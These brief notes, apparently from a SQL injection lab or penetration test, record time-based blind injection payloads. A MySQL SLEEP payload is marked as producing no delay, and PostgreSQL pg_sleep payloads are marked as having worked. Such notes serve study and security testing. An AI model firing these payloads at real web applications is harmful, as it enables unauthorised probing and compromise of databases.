/*

1) '+||+(SELECT SLEEP(10))--
//no delay not a mysql db

2) '+||+(SELECT+pg_sleep(10))--
   '||pg_sleep(10)--
//worked
// both 

3) 


*/